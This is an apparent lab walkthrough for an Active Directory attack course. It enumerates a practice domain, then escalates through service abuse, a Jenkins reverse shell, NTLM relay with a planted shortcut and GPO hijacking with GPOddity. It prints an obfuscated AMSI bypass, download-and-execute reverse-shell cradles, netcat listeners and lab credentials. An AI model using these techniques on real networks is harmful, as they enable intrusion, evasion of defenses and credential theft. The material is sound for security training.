
## Instructions
* All commands is running by PowerView
* Please remember to turn-off or add an exception to your student VMs firewall when your run listener for a reverse shell
* Using Invisi-Shell to avoid enhanced logging
* AMSI bypass
```
S`eT-It`em ( 'V'+'aR' +  'IA' + (("{1}{0}"-f'1','blE:')+'q2')  + ('uZ'+'x')  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    Get-varI`A`BLE  ( ('1Q'+'2U')  +'zX'  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),(("{0}{1}" -f '.M','an')+'age'+'men'+'t.'),('u'+'to'+("{0}{2}{1}" -f 'ma','.','tion')),'s',(("{1}{0}"-f 't','Sys')+'em')  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+("{0}{1}" -f 'ni','tF')+("{1}{0}"-f 'ile','a'))  ),(  "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+("{1}{0}" -f'ubl','P')+'i'),'c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )
```

## Objective 1
```
Enumerate following for the dollarcorp domain:
− Users
− Computers
− Domain Administrators
− Enterprise Administrators
• Use BloodHound to identify the shortest path to Domain Admins in the dollarcorp domain.
• Find a file share where studentx has Write permissions.
```
### Invisi-Shell
* C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat

### Return all users or specific user objects in AD
* Get-DomainUser
* Get-DomainUser | select -ExpandProperty samaccountname

### Member computers
* Get-DomainComputer | select -ExpandProperty dnshostname
```
dcorp-dc.dollarcorp.moneycorp.local
dcorp-mssql.dollarcorp.moneycorp.local
dcorp-ci.dollarcorp.moneycorp.local
dcorp-mgmt.dollarcorp.moneycorp.local
dcorp-appsrv.dollarcorp.moneycorp.local
dcorp-adminsrv.dollarcorp.moneycorp.local
dcorp-sql1.dollarcorp.moneycorp.local
```

### Details of the Domain Admins group 
* Get-DomainGroup -Identity "Domain Admins"

### Enumerate members of the Domain Admins group
* Get-DomainGroupMember -Identity "Domain Admins"
* Get-DomainGroupMember -Identity "Enterprise Admins"
* Get-DomainGroupMember -Identity "Enterprise Admins" -Domain moneycorp.local

### BloodHound ingestores
* C:\AD\Tools\BloodHound-master\BloodHoundmaster\Collectors\SharpHound.exe --collectionmethods Group,GPOLocalGroup,Session,Trusts,ACL Container,ObjectProps,SPNTargets --excludedcs

### File with all servers
* cat C:\AD\Tools\servers.txt 
```
DCORP-ADMINSRV 
DCORP-APPSRV 
DCORP-CI 
DCORP-MGMT 
DCORP-MSSQL 
DCORP-SQL1
DCORP-STDADMIN
DCORP-STD2
DCORP-STUDENT1
```

### File share where studentx has Write permissions, Use the PowerHuntShares to search for file shares.
* Import-Module C:\AD\Tools\PowerHuntShares.psm1
* Invoke-HuntSMBShares -NoPing -OutputDirectory C:\AD\Tools\ -HostList C:\AD\Tools\servers.txt
```
with the top 200 share names.
[*][12/24/2024 04:02] - 2 ADMIN$
[*][12/24/2024 04:02] - 2 C$
[*][12/24/2024 04:02] - 1 studentshare2
[*][12/24/2024 04:02] - 1 AI
[*] -----------------------------------------------
[*][12/24/2024 04:02] - Generating HTML Report
[*][12/24/2024 04:02] - Estimated generation time: 1 minute or less
[*][12/24/2024 04:02] - All files written to C:\AD\Tools\\SmbShareHunt12242024040138
```

<img width="1824" height="583" alt="image" src="https://github.com/user-attachments/assets/e319a78c-39ad-42b8-8e5a-0b87d0f2d866" />


<img width="1563" height="736" alt="image" src="https://github.com/user-attachments/assets/685e06cd-e7a2-429d-b9af-fdf45a05358b" />


## Objective 2:
```
• Enumerate following for the dollarcorp domain:
− ACL for the Domain Admins group
− ACLs where studentx has interesting permissions
• Analyze the permissions for studentx in BloodHound UI
```

### Enumerate ACLs for the Domain Admins Group
* Get-DomainObjectAcl -Identity "Domain Admins" -ResolveGUIDs -Verbose

### Check for modify rights/permissions
* Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match "studentx"} 
* Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match "RDPUsers"}
```
ObjectDN : 
CN=ControlxUser,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local
AceQualifier : AccessAllowed
ActiveDirectoryRights : GenericAll
ObjectAceType : None
AceFlags : None
AceType : AccessAllowed
InheritanceFlags : None
SecurityIdentifier : S-1-5-21-719815819-3726368948-3917688648-1123
IdentityReferenceName : RDPUsers
IdentityReferenceDomain : dollarcorp.moneycorp.local
IdentityReferenceDN : CN=RDP 
Users,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local
IdentityReferenceClass : group
```

### Analyze the permissions for studentx using BloodHound UI
### Let’s look at the 'Outbound Object Control' for the studentx
```
Multiple permissions stand out in the above diagram. Due to the membership of the RDPUsers group, 
the studentx user has following interesting permissions
- Full Control/Generic All over supportx and controlx users. 
- Enrollment permissions on multiple certificate templates.
- Full Control/Generic All on the Applocked Group Policy.
```

<img width="1147" height="438" alt="image" src="https://github.com/user-attachments/assets/9b460e63-fd21-4213-9802-6f66b5584a73" />

<img width="1202" height="619" alt="image" src="https://github.com/user-attachments/assets/4bd6692b-dfd8-4888-8148-0722a408890b" />

<img width="1255" height="868" alt="image" src="https://github.com/user-attachments/assets/744a2e20-b057-4de4-9fef-949f99478625" />


## Objective 3
```
• Enumerate following for the dollarcorp domain:
− List all the OUs
− List all the computers in the DevOps OU
− List the GPOs 
− Enumerate GPO applied on the DevOps OU
− Enumerate ACLs for the Applocked and DevOps GPOs
```

### List all the OUs
* Get-DomainOU
* Get-DomainOU | select -ExpandProperty name

### List all the computers in the DevOps OU
* (Get-DomainOU -Identity DevOps).distinguishedname | %{Get-DomainComputer -SearchBase $_} | select name
```
Domain Controllers
StudentMachines
Applocked
Servers
DevOps
```

### List all the GPOs
* Get-DomainGPO
```
flags : 0
systemflags : -1946157056
displayname : Default Domain Policy
[snip]
flags : 0
displayname : DevOps Policy
gpcmachineextensionnames : [{35378EAC-683F-11D2-A89A-00C04FBBCFA2}{D02B1F72-
3407-48AE-BA88-E8213C6761F1}][{827D319E-6EAC-11D2-A4EA-00C04F79F83A}{803E14A0-B4FB-11D0-A0D0-00A0C90F574B}]
whenchanged : 12/19/2024 12:00:15 PM
versionnumber : 3
name : {0BF8D01C-1F62-4BDC-958C-57140B67D147}
```

### Enumerate GPO applied on the DevOps OU (we need the name of the policy from the gplink attribute from the OU)
* (Get-DomainOU -Identity DevOps).gplink
```
LDAP://cn={0BF8D01C-1F62-4BDC-958C-57140B67D147},cn=policies,cn=system,DC=dollarcorp,DC=moneycorp,DC=local;0]
```

### More informations about this GPO
* Get-DomainGPO -Identity '{0BF8D01C-1F62-4BDC-958C-57140B67D147}'
```
flags : 0
displayname : DevOps Policy
gpcmachineextensionnames : [{35378EAC-683F-11D2-A89A-00C04FBBCFA2}{D02B1F72-
3407-48AE-BA88-E8213C6761F1}][{827D319E-6EAC-11D2-A4EA-00C04F79F83A}{803E14A0-B4FB-11D0-A0D0-00A0C90F574B}]
whenchanged : 12/19/2024 12:00:15 PM
versionnumber : 3
name : {0BF8D01C-1F62-4BDC-958C-57140B67D147}
cn : {0BF8D01C-1F62-4BDC-958C-57140B67D147}
usnchanged : 314489
dscorepropagationdata : {12/18/2024 7:31:56 AM, 1/1/1601 12:00:00 AM}
objectguid : fc0df125-5e26-4794-93c7-e60c6eecb75f
gpcfilesyspath : 
\\dollarcorp.moneycorp.local\SysVol\dollarcorp.moneycorp.local\Policies\{0BF8
D01C-1F62-4BDC-958C-57140B67D147}
distinguishedname : CN={0BF8D01C-1F62-4BDC-958C-57140B67D147},CN=Policies,CN=System,DC=dollarcorp,DC=moneycorp,DC=local
whencreated : 12/18/2024 7:31:22 AM
showinadvancedviewonly : True
usncreated : 293100
gpcfunctionalityversion : 2
instancetype : 4
objectclass : {top, container, groupPolicyContainer}
objectcategory : CN=Group-Policy-Container,CN=Schema,CN=Configuration,DC=moneycorp,DC=local
```

### To enumerate the ACLs for the Applocked and DevOps GPO, let's use the BloodHound CE UI
<img width="1142" height="442" alt="image" src="https://github.com/user-attachments/assets/db049f5f-c56d-4e52-beec-16fa8414de94" />

<img width="931" height="637" alt="image" src="https://github.com/user-attachments/assets/7fa52467-8bd9-462d-8db1-aadc4712bcba" />


**A user named 'devopsadmin' has 'WriteDACL' on DevOps Policy.**

## Objective 4
```
• Enumerate all domains in the moneycorp.local forest. 
• Map the trusts of the dollarcorp.moneycorp.local domain.
• Map External trusts in moneycorp.local forest. 
• Identify external trusts of dollarcorp domain. Can you enumerate trusts for a trusting forest?
```

### Enumerate all domains in the current forest
* Get-ForestDomain -Verbose

### Map all the trusts of the dollarcorp domain
* Get-DomainTrust
```
SourceName : dollarcorp.moneycorp.local
TargetName : moneycorp.local
TrustType : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : WITHIN_FOREST
TrustDirection : Bidirectional
WhenCreated : 11/12/2022 5:59:01 AM
WhenChanged : 2/24/2023 9:11:33 AM

SourceName : dollarcorp.moneycorp.local
TargetName : us.dollarcorp.moneycorp.local
TrustType : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : WITHIN_FOREST
TrustDirection : Bidirectional
WhenCreated : 11/12/2022 6:22:51 AM
WhenChanged : 2/24/2023 9:09:58 AM

SourceName : dollarcorp.moneycorp.local
TargetName : eurocorp.local
TrustType : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FILTER_SIDS
TrustDirection : Bidirectional
WhenCreated : 11/12/2022 8:15:23 AM
WhenChanged : 2/24/2023 9:10:52 AM
```

### list only the external trusts in the moneycorp.local forest
* Get-ForestDomain | %{Get-DomainTrust -Domain $_.Name} | ?{$_.TrustAttributes -eq "FILTER_SIDS"}
```
SourceName : dollarcorp.moneycorp.local
TargetName : eurocorp.local
TrustType : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FILTER_SIDS
TrustDirection : Bidirectional
WhenCreated : 11/12/2022 8:15:23 AM
WhenChanged : 2/24/2023 9:10:52 AM
```

### Identify external trusts of the dollarcorp domain
*  Get-DomainTrust | ?{$_.TrustAttributes -eq "FILTER_SIDS"}
```
SourceName : dollarcorp.moneycorp.local
TargetName : eurocorp.local
TrustType : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FILTER_SIDS
TrustDirection : Bidirectional
WhenCreated : 11/12/2022 8:15:23 AM
WhenChanged : 2/24/2023 9:10:52 AM
```

**Since the above is a Bi-Directional trust, we can extract information from the eurocorp.local forest**
* Get-ForestDomain -Forest eurocorp.local | %{Get-DomainTrust -Domain $_.Name}


## Objective 5
```
• Exploit a service on dcorp-studentx and elevate privileges to local administrator. 
• Identify a machine in the domain where studentx has local administrative access.
• Using privileges of a user on Jenkins on 172.16.3.11:8080, get admin privileges on 172.16.3.11 - the dcorp-ci server.
```

### Local Privilege Escalation - PowerUp
**We can use Powerup from PowerSploit module to check for any privilege escalation path. Feel free to use other tools mentioned in the class like WinPEAS**

* . C:\AD\Tools\PowerUp.ps1
* Invoke-AllChecks
```
[*] Running Invoke-AllChecks
[*] Checking if user is in a local group with administrative privileges...
[*] Checking for unquoted service paths...
ServiceName : AbyssWebServer
Path : C:\WebServer\Abyss Web Server\abyssws.exe -service
ModifiablePath : @{ModifiablePath=C:\WebServer; 
IdentityReference=BUILTIN\Users; Permissions=AppendData/AddSubdirectory}
StartName : LocalSystem
AbuseFunction : Write-ServiceBinary -Name 'AbyssWebServer' -Path 
<HijackPath>
CanRestart : True
ServiceName : AbyssWebServer
Path : C:\WebServer\Abyss Web Server\abyssws.exe -service
ModifiablePath : @{ModifiablePath=C:\WebServer; 
IdentityReference=BUILTIN\Users; Permissions=WriteData/AddFile}
StartName : LocalSystem
AbuseFunction : Write-ServiceBinary -Name 'AbyssWebServer' -Path 
<HijackPath>
CanRestart : True
[snip]

[*] Checking service executable and argument permissions...
ServiceName : AbyssWebServer
AlteredSecurity Attacking and Defending Active Directory 35
Path : C:\WebServer\Abyss Web Server\abyssws.exe -
service
ModifiableFile : C:\WebServer\Abyss Web Server
ModifiableFilePermissions : {WriteOwner, Delete, WriteAttributes, 
Synchronize...}
ModifiableFileIdentityReference : Everyone
StartName : LocalSystem
AbuseFunction : Install-ServiceBinary -Name 
'AbyssWebServer'
CanRestart : True

[snip]
[*] Checking service permissions...
ServiceName : AbyssWebServer
Path : C:\WebServer\Abyss Web Server\abyssws.exe -service
StartName : LocalSystem
AbuseFunction : Invoke-ServiceAbuse -Name 'AbyssWebServer'
CanRestart : True
```

### Abuse function for Invoke-ServiceAbuse and add our current domain user to the local Administrators group

*  Invoke-ServiceAbuse -Name 'AbyssWebServer' -UserName 'dcorp\studentx' -Verbose
```
VERBOSE: Service 'AbyssWebServer' original path: 'C:\WebServer\Abyss Web Server\abyssws.exe -service'
VERBOSE: Service 'AbyssWebServer' original state: 'Stopped'
VERBOSE: Executing command 'net localgroup Administrators dcorp\student1 /add'
VERBOSE: binPath for AbyssWebServer successfully set to 'net localgroup Administrators dcorp\studentx /add'
```

**We can see that the dcorp\studentx is a local administrator now. Just logoff and logon again and we have local administrator privileges!**

### Hunt for Local Admin access

**To identify a machine in the domain where studentx has local administrative access, use Find-PSRemotingLocalAdminAccess.ps1**

* . C:\AD\Tools\Find-PSRemotingLocalAdminAccess.ps1
* Find-PSRemotingLocalAdminAccess
```
dcorp-adminsrv
```

**Studentx has administrative access on dcorp-adminsrv and on the student machine.** 
**We can connect to dcorp-adminsrv using winrs as the student user**

* winrs -r:dcorp-adminsrv cmd
```
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.
```

* set username
```
set username
USERNAME=studentx
```

* set computername
```
computername
COMPUTERNAME=dcorp-adminsrv
```

**PowerShell Remoting**
* Enter-PSSession -ComputerName dcorp-adminsrv.dollarcorp.moneycorp.local

* [dcorp-adminsrv.dollarcorp.moneycorp.local]C:\Users\studentx\Documents>$env:username
```
dcorp\studentx
```

## Abuse Jenkins Instance
**We have a misconfigured Jenkins instance on dcorp-ci (http://172.16.3.11:8080)**
**Manually trying the usernames as passwords we can identify that the user builduser has password builduser.**
**Use the encodedcomand parameter of PowerShell to use an encoded reverse shell or use download execute cradle in Jenkins build step.**

* powershell.exe iex (iwr http://172.16.100.X/Invoke-PowerShellTcp.ps1 -UseBasicParsing);Power -Reverse -IPAddress 172.16.100.X -Port 443

**make sure to add an exception or turn off the firewall on the student VM.**
**You can find hfs.exe in the C:\AD\Tools directory of your student VM. Note that HFS goes in the system tray when minimized**

* C:\AD\Tools\netcat-win32-1.12\nc64.exe -lvp 443

![alt text](image-11.png)

![alt text](image-8.png)

![alt text](image-9.png)

![alt text](image-10.png)

![alt text](image-12.png)

* PS C:\Users\Administrator\.jenkins\workspace\Project0> $env:username
```
Ciadmin
```
* PS C:\Users\Administrator\.jenkins\workspace\Project0>$env:computername

## Objective 6
```
Abuse an overly permissive Group Policy to add studentx to the local administrators group on dcorp-ci.
```

### In Learning-Objective 1, we enumerated that there is a directory called 'AI' on the dcorp-ci machine where 'Everyone' has access Looking at the directory (\\\dcorp-ci\AI), we will find a log file

![alt text](image-13.png)

![alt text](image-14.png)

### It turns out that the 'AI' folder is used for testing some automation that executes shortcuts (.lnk files) as the user 'devopsadmin'. Recall that we enumerated a user 'devopsadmin' has 'WriteDACL' on DevOps Policy. Let's try to abuse this using GPOddity

### First, we will use ntlmrelayx tool from Ubuntu WSL instance on the student VM to relay the credentials of the devopsadmin user.

* Use WSLToTh3Rescue! as the sudo password.

* wsluser@dcorp-studentx:/mnt/c/Users/studentx$> sudo ntlmrelayx.py -t ldaps://172.16.2.1 -wh 172.16.100.x --http-port '80,8080' -i --no-smb-server

![alt text](image-15.png)

### On the student VM, let's create a Shortcut that connects to the ntlmrelayx listener. 
### Go to C:\AD\Tools -> Right Click -> New -> Shortcut. Copy the following command in the Shortcut location:

* C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -Command "Invoke_WebRequest -Uri 'http://172.16.100.31' -UseDefaultCredentials"

![alt text](image-16.png)

![alt text](image-17.png)

**Copy shortcut to dcorp-ci**

* C:\AD\Tools>xcopy C:\AD\Tools\studentx.lnk \\\dcorp-ci\AI

### Connect to the ldap shell started on port 11000. Run the following command on a new Ubuntu WSL session

* wsluser@dcorp-studentx:/mnt/c/Users/studentx$> nc 127.0.0.1 11000

![alt text](image-18.png)

![alt text](image-19.png)

### Using this ldap shell, we will provide the studentx user, WriteDACL permissions over Devops Policy {0BF8D01C-1F62-4BDC-958C-57140B67D147}

* Get-DomainGPO | select displayname, name

![alt text](image-20.png)

![alt text](image-21.png)

![alt text](image-22.png)

* write_gpo_dacl student731 {0BF8D01C-1F62-4BDC-958C-57140B67D147}

![alt text](image-23.png)

### Now, run the GPOddity command to create the new template.
```
sudo python3 gpoddity.py --gpo-id '0BF8D01C-1F62-4BDC-958C-57140B67D147' --domain 'dollarcorp.moneycorp.local' --username 'student731' --password 'rMszB5MwUBww29' --command 'net localgroup administrators student731 /add' --rogue-smbserver-ip '172.16.100.31' --rogue-smbserver-share 'std731-gp' --dc-ip '172.16.2.1' --smb-mode none
```

![alt text](image-24.png)


### Another Ubuntu WSL session, create and share the stdx-gp directory

* wsluser@dcorp-std731:/mnt/c/Users/student731$> mkdir /mnt/c/AD/Tools/std731-gp 
* wsluser@dcorp-std731:/mnt/c/Users/student731$> cp -r /mnt/c/AD/Tools/GPOddity/GPT_Out/* /mnt/c/AD/Tools/std731-gp

### From a command prompt (Run as Administrator) on the student VM, run the following commands to allow 'Everyone' full permission on the stdx-gp share

* C:\Windows\system32>net share stdx-gp=C:\AD\Tools\std731-gp
* icacls "C:\AD\Tools\std731-gp" /grant Everyone:F /T

**icacls Displays or modifies discretionary access control lists (DACLs) on specified files and applies stored DACLs to files in specified directories**

![alt text](image-25.png)

### Verify if the gPCfileSysPath has been modified for the DevOps Policy.

* Get-DomainGPO -Identity 'DevOps Policy'

### Before
![alt text](image-26.png)

### After
![alt text](image-27.png)

**After waiting for 2 minutes, studentx should be added to the local administrators group on dcorp-ci**

* C:\AD\Tools>winrs -r:dcorp-ci cmd /c "set computername && set username"
```
COMPUTERNAME=DCORP-CI
USERNAME=student731
```

* winrs -r:dcorp-ci cmd

![alt text](image-28.png)

## Objective 7
```
Identify a machine in the target domain where a Domain Admin session is available. 
• Compromise the machine and escalate privileges to Domain Admin by abusing reverse shell on 
dcorp-ci.
• Escalate privilege to DA by abusing derivative local admin through dcorp-adminsrv. On dcorp-adminsrv, tackle application allowlisting using: 
− Gaps in Applocker rules. 
− Disable Applocker by modifying GPO applicable to dcorp-adminsrv
```

### Identify a machine where Domain Admin session is available
**We have access to two domain users - student731 and ciadmin and administrative access to dcorp-adminsrv machine. User hunting has not been fruitful as student731**

### Enumeration using Invoke-SessionHunter to list sessions on all the remote machines
* . C:\AD\Tools\Invoke-SessionHunter.ps1
* Invoke-SessionHunter -NoPortScan -RawResults | select Hostname,UserSession,Access
```
[+] Elapsed time: 0:0:51.674
HostName UserSession Access
-------- ----------- ------
dcorp-appsrv    dcorp\appadmin      False
dcorp-ci        dcorp\ciadmin       False
dcorp-mgmt      dcorp\mgmtadmin     False
dcorp-mssql     dcorp\sqladmin      False
dcorp-dc        dcorp\Administrator False
dcorp-mgmt      dcorp\svcadmin      False
dcorp-adminsrv  dcorp\appadmin      True
dcorp-adminsrv  dcorp\srvadmin      True
dcorp-adminsrv  dcorp\websvc        True
```

* Invoke-SessionHunter -NoPortScan -RawResults -Targets C:\AD\Tools\servers.txt | select Hostname,UserSession,Access

**There is a domain admin (svcadmin) session on dcorp-mgmt server! We do not have access to the server but that comes late**

![alt text](image-29.png)

### We got a reverse shell on dcorp-ci as ciadmin by abusing Jenkins.
**We can use Powerview’s Find-DomainUserLocation on the reverse shell to looks for machines where a domain admin is logged in. First, we must bypass AMSI and enhanced logging**

* PS C:\Users\Administrator\.jenkins\workspace\Projectx> iex (iwr http://172.16.100.31/sbloggingbypass.txt -UseBasicParsing)

### bypass AMSI
```
S`eT-It`em ( 'V'+'aR' +  'IA' + (("{1}{0}"-f'1','blE:')+'q2')  + ('uZ'+'x')  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    Get-varI`A`BLE  ( ('1Q'+'2U')  +'zX'  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),(("{0}{1}" -f '.M','an')+'age'+'men'+'t.'),('u'+'to'+("{0}{2}{1}" -f 'ma','.','tion')),'s',(("{1}{0}"-f 't','Sys')+'em')  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+("{0}{1}" -f 'ni','tF')+("{1}{0}"-f 'ile','a'))  ),(  "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+("{1}{0}" -f'ubl','P')+'i'),'c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )
```

![alt text](image-30.png)

**Now, download and execute PowerView in memory of the reverse shell and run Find-DomainUserLocation. Check all the machines in the domain**

* iex ((New-Object Net.WebClient).DownloadString('http://172.16.100.X/PowerView.ps1'))
* Find-DomainUserLocation

![alt text](image-32.png)

**There is a domain admin session on dcorp-mgmt server**

**Let’s check if we can execute commands on dcorp-mgmt server and if the winrm port is open**

* PS C:\Users\Administrator\.jenkins\workspace\Projectx> winrs -r:dcorp-mgmt cmd /c "set computername && set username"
```
COMPUTERNAME=DCORP-MGMT
USERNAME=ciadmin`
```

**We would now run SafetyKatz.exe on dcorp-mgmt to extract credentials from it. For that, we need to  copy Loader.exe on dcorp-mgmt Let's download Loader.exe on dcorp-ci and copy it from there to dcorp-mgmt. This is to avoid any downloading activity on dcorp-mgmt**
